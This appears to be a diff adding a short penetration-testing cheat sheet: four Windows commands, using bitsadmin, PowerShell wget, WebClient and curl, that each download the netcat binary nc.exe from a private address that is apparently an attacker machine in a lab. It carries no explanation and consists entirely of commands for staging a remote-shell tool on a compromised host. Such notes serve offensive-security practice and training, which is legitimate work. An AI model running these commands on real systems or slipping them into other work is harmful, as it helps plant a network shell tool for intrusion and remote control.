@@ -1,0 +1,8 @@
+
+bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.15.57/nc.exe C:\Users\Public\nc.exe
+
+powershell wget "http://10.10.15.57/nc.exe" -outfile "nc.exe" 
+
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.57/nc.exe', 'nc.exe')"
+
+powershell -Command "curl -o ncc.exe http://10.10.15.57/nc.exe"
